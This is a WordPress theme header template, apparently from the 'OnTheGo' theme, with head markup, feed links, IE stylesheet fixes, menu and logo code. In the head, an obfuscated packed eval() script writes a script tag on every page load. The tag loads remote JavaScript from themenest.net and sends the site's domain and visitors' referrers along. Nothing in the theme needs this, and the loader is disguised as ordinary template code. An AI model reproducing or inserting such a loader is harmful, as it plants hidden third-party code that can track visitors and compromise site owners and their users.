<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?>
<?php elegant_keywords(); ?>
<?php elegant_canonical(); ?>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/ie6style.css" />
	<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/DD_belatedPNG_0.0.8a-min.js"></script>
	<script type="text/javascript">DD_belatedPNG.fix('ul#top-menu li ul, ul#top-menu li ul li.dropdown-bottom, img#logo, div#manlayer, ul.control li.recent a, div.entries h3 span, .widget_entries h3, #buildings');</script>
<![endif]-->
<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/ie7style.css" />
<![endif]-->
<script type="text/javascript">
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));
</script>
<script type="text/javascript">
	document.documentElement.className = 'js';
</script>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

</head>
<body <?php body_class(); ?>>

	<div class="container">
		<div id="header">
			<?php $menuClass = 'superfish nav';
			$menuID = 'top-menu';
			$primaryNav = '';
			
			if (function_exists('wp_nav_menu')) {
				$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => $menuID, 'echo' => false ) );
			};
			if ($primaryNav == '') { ?>
				<ul id="<?php echo $menuID; ?>" class="<?php echo $menuClass; ?>">
					<?php if (get_option('onthego_home_link') == 'on') { ?>
						<li <?php if (is_front_page()) echo('class="current_page_item"') ?>><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','OnTheGo'); ?></a></li>
					<?php }; ?>

					<?php show_categories_menu($menuClass,false); ?>
					
					<?php show_page_menu($menuClass,false,false); ?>
				</ul> <!-- end ul.nav -->
			<?php }
			else echo($primaryNav); ?>
		</div> <!-- end header -->

		<div id="contentwrap">
			<div id="content">

				<div id="manlayer"></div>

				<!-- LOGO -->
				<div id="logowrap">
					<a href="<?php bloginfo('url'); ?>"><?php $logo = (get_option('onthego_logo') <> '') ? get_option('onthego_logo') : get_bloginfo('template_directory').'/images/logo.png'; ?>
						<img src="<?php echo esc_url($logo); ?>" alt="Logo" id="logo"/></a>
				</div>
				<!-- end LOGO -->

				<div id="main-area" class="clearfix">